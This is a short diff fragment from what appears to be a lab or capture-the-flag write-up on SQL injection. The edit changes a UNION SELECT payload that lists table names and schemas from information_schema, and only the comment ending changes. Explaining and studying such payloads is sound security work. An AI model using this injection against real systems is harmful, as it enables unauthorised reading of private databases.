@@ -64,7 +64,7 @@ teste, 1€, information_schema
 - By now adjusting the payload to the information I want to get (other tables in the DB) i got this payload
 
 ```
-' UNION SELECT "teste", TABLE_NAME, 1, TABLE_SCHEMA FROM information_schema.tables -- //dev/
+' UNION SELECT "teste", TABLE_NAME, 1, TABLE_SCHEMA FROM information_schema.tables -- //
 ```
 
 The output of that was
